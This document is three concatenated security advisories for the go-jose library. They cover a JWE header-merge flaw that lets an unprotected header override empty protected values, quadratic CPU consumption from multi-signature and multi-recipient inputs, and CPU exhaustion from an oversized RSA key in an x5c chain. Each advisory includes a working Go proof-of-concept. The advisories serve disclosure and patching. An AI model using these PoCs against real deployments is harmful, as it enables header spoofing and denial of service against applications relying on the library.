description:
### Summary

A third-party in possession of a valid JWE can, without modifying the JWE's protected header, control the value that go-jose exposes in `JSONWebEncryption.Header` for any field whose value in the protected header is `""` or `null`.

### Details

The vulnerability requires three things to be true:
- The producer of the JWE explicitly includes a field in the protected header whose value is `""` or `null`.
- The receiver of the JWE uses `ParseEncrypted` or `ParseEncryptedJSON`, rather than a compact-only parser.
- The receiver of the JWE accesses or cares about the value of that field.

In that case, a third-party can add an unprotected header with the same field name to the JWE. Doing so does not touch any of the protected bytes, so the authentication tag remains valid. When the receiving application parses the JWE, the non-zero value from the unprotected header will overwrite the zero value from the unprotected header, potentially resulting in the application trusting malicious data.

This bug arises because the parsing routine "merges" the unprotected headers on top of the protected headers. When it does so, it detects whether a header has already been set by detecting if its _value_ is non-zero, rather than by checking whether its key exists in the headers map. In the attack scenario, the protected header is present but has a zero value, so the merge routine overwrites it with the value from the unprotected header.

### Proof of concept

```go
package main

import (
	"encoding/json"
	"fmt"

	jose "github.com/go-jose/go-jose/v4"
)

func main() {
	key := make([]byte, 16)

	// Encrypt with an explicitly-empty field in the protected header.
	encrypter, err := jose.NewEncrypter(jose.A128GCM,
		jose.Recipient{Algorithm: jose.DIRECT, Key: key},
		(&jose.EncrypterOptions{}).WithHeader("repro", ""))
	if err != nil {
		panic(err)
	}
	obj, err := encrypter.Encrypt([]byte("hello"))
	if err != nil {
		panic(err)
	}

	// Add an unprotected header with a non-empty field of the same name.
	// The protected header bytes are untouched, so the authentication tag is still valid.
	var msg map[string]json.RawMessage
	err = json.Unmarshal([]byte(obj.FullSerialize()), &msg)
	if err != nil {
		panic(err)
	}
	msg["unprotected"] = json.RawMessage(`{"repro":"oops"}`)
	raw, err := json.Marshal(msg)
	if err != nil {
		panic(err)
	}
	fmt.Println(string(raw))

	// ParseEncryptedJSON demonstrates the bug.
	parsed, err := jose.ParseEncryptedJSON(string(raw),
		[]jose.KeyAlgorithm{jose.DIRECT}, []jose.ContentEncryption{jose.A128GCM})
	if err != nil {
		panic(err)
	}
	_, err = parsed.Decrypt(key)
	if err != nil {
		panic(err)
	}

	// Want "" (protected), got "oops" (unprotected).
	fmt.Printf("Header.ExtraHeaders[\"repro\"] = %q\n", parsed.Header.ExtraHeaders["repro"])
}
```

### Impact

Users of go-jose which use `ParseEncrypted` or `ParseEncryptedJSON` rather than a compact-only parser, and which receive JWEs whose protected headers may include explicit `""` or `null` values. Note that go-jose itself never produces such JWEs.

### Acknowledgements

Found via [oss-scanner](https://red.anthropic.com/oss-scanner/).

### Summary

Applications that process JWS and JWE JSON serialization from untrusted inputs can be caused to consume CPU time quadratic in input size.

### Details

An attacker can craft a JWS or JWE JSON serialization object with a large number of signatures or recipients, respectively, and either a large payload or a large number of headers. This will result in the application spending time quadratic in CPU.

### Proof of concept

```go
package main

import (
	"fmt"
	"strings"
	"time"

	jose "github.com/go-jose/go-jose/v4"
)

func list(entry string, n int) string { return strings.TrimSuffix(strings.Repeat(entry+",", n), ",") }

func timed(name string, f func() error) {
	start := time.Now()
	err := f()
	fmt.Printf("%-20s %8.3fs  err=%v\n", name, time.Since(start).Seconds(), err)
}

func main() {
	var hdr strings.Builder
	for i := 0; i < 4000; i++ {
		fmt.Fprintf(&hdr, `,"%x":0`, i)
	}
	jwe1 := `{"unprotected":{"alg":"dir","enc":"A128GCM"` + hdr.String() + `},"recipients":[` + list("{}", 10000) +
		`],"iv":"AAAAAAAAAAAAAAAA","ciphertext":"AA","tag":"AAAAAAAAAAAAAAAAAAAAAA"}`
	timed("ParseEncrypted", func() error {
		_, err := jose.ParseEncrypted(jwe1, []jose.KeyAlgorithm{jose.DIRECT}, []jose.ContentEncryption{jose.A128GCM})
		return err
	})

	jwe2 := `{"unprotected":{"alg":"dir","enc":"A128CBC-HS256"},"recipients":[` + list("{}", 16000) +
		`],"iv":"AAAAAAAAAAAAAAAAAAAAAA","ciphertext":"` + strings.Repeat("A", 200000) + `","tag":"AAAAAAAAAAAAAAAAAAAAAA"}`
	timed("DecryptMulti", func() error {
		obj, err := jose.ParseEncrypted(jwe2, []jose.KeyAlgorithm{jose.DIRECT}, []jose.ContentEncryption{jose.A128CBC_HS256})
		if err != nil {
			return fmt.Errorf("parse: %w", err)
		}
		_, _, _, err = obj.DecryptMulti(make([]byte, 32))
		return err
	})

	sigs := list(`{"protected":"eyJhbGciOiJIUzI1NiJ9","signature":"AA"}`, 6500)
	timed("VerifyMulti", func() error {
		obj, err := jose.ParseSigned(`{"payload":"`+strings.Repeat("A", 250000)+`","signatures":[`+sigs+`]}`,
			[]jose.SignatureAlgorithm{jose.HS256})
		if err != nil {
			return fmt.Errorf("parse: %w", err)
		}
		_, _, _, err = obj.VerifyMulti(make([]byte, 32))
		return err
	})

	timed("DetachedVerifyMulti", func() error {
		obj, err := jose.ParseSigned(`{"payload":"","signatures":[`+sigs+`]}`, []jose.SignatureAlgorithm{jose.HS256})
		if err != nil {
			return fmt.Errorf("parse: %w", err)
		}
		_, _, err = obj.DetachedVerifyMulti([]byte(strings.Repeat("A", 187500)), make([]byte, 32))
		return err
	})
}
```

### Impact

Denial of service for applications that process JWS or JWE JSON serialization. Specifically those that call `VerifyMulti`, `DetachedVerifyMulti`, `ParseEncrypted`, or `DecryptMulti`.


### Acknowledgements

Found via [oss-scanner](https://red.anthropic.com/oss-scanner/).

### Summary

An RSA key with a large modulus inside a certificate chain in the "x5c" header can cause applications that call `Header.Certificates()` to consume excess CPU.

### Details

go-jose does not check for bounds on RSA modulus before verifying certificates.

### Proof of concept

```go
// Package main demonstrates untrusted input consuming CPU time quadratic in
// input size.
package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"fmt"
	"math/big"
	"time"

	jose "github.com/go-jose/go-jose/v4"
)

const modulusBits = 262144


func mkCert(tmpl, parent *x509.Certificate, pub interface{}, signKey *rsa.PrivateKey) *x509.Certificate {
	if parent == nil {
		parent = tmpl
	}
	der, err := x509.CreateCertificate(rand.Reader, tmpl, parent, pub, signKey)
	if err != nil {
		panic(err)
	}
	cert, err := x509.ParseCertificate(der)
	if err != nil {
		panic(err)
	}
	return cert
}

func caTmpl(cn string, skid []byte) *x509.Certificate {
	return &x509.Certificate{
		SerialNumber:          big.NewInt(time.Now().UnixNano()),
		Subject:               pkix.Name{CommonName: cn},
		NotBefore:             time.Now().Add(-time.Hour),
		NotAfter:              time.Now().Add(time.Hour),
		BasicConstraintsValid: true,
		IsCA:                  true,
		KeyUsage:              x509.KeyUsageCertSign,
		SubjectKeyId:          skid,
	}
}

func main() {
	signKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		panic(err)
	}

	// A non-trusted root just to help us sign a fake hierarchy.
	bogusRoot := mkCert(caTmpl("bogus-root", nil), nil, &signKey.PublicKey, signKey)

	// Make two intermediates, one that goes in the JWS and one that is just used
  // to sign a leaf.
	n := new(big.Int).Lsh(big.NewInt(1), modulusBits)
	n.SetBit(n, 0, 1)
	oversizedKey := &rsa.PublicKey{N: n, E: 65537}
  var fixedSKID = []byte{0x01, 0x02, 0x03, 0x04}
	oversizedKeyIntermediate := mkCert(caTmpl("intermediate", fixedSKID), bogusRoot, oversizedKey, signKey)

	temporaryIntermediate := mkCert(caTmpl("intermediate", fixedSKID), bogusRoot, &signKey.PublicKey, signKey)

	leaf := mkCert(&x509.Certificate{
		SerialNumber: big.NewInt(time.Now().UnixNano() + 1),
		Subject:      pkix.Name{CommonName: "leaf"},
		NotBefore:    time.Now().Add(-time.Hour),
		NotAfter:     time.Now().Add(time.Hour),
	}, temporaryIntermediate, &signKey.PublicKey, signKey)

	signer, err := jose.NewSigner(
		jose.SigningKey{Algorithm: jose.RS256, Key: signKey},
		&jose.SignerOptions{ExtraHeaders: map[jose.HeaderKey]interface{}{
			jose.HeaderKey("x5c"): []string{
				base64.StdEncoding.EncodeToString(leaf.Raw),
				base64.StdEncoding.EncodeToString(oversizedKeyIntermediate.Raw),
			},
		}},
	)
	if err != nil {
		panic(err)
	}
	signed, err := signer.Sign([]byte("payload"))
	if err != nil {
		panic(err)
	}
	msg := signed.FullSerialize()

	parsed, err := jose.ParseSigned(msg, []jose.SignatureAlgorithm{jose.RS256})
	if err != nil {
		panic(err)
	}

	// A simulated trusted root that hasn't signed anything.
	appRoot := mkCert(caTmpl("app-root", nil), nil, &signKey.PublicKey, signKey)
	roots := x509.NewCertPool()
	roots.AddCert(appRoot)

	fmt.Printf("message is %d bytes; intermediate modulus is %d bits\n", len(msg), modulusBits)
	start := time.Now()
	_, err = parsed.Signatures[0].Protected.Certificates(x509.VerifyOptions{Roots: roots})
	fmt.Printf("Certificates() took %s (err=%v)\n", time.Since(start), err)
}
```

### Impact

Denial of service vulnerability. Any application that calls Headers.Certificates is affected and should patch immediately.


### Acknowledgements

Found via [oss-scanner](https://red.anthropic.com/oss-scanner/).
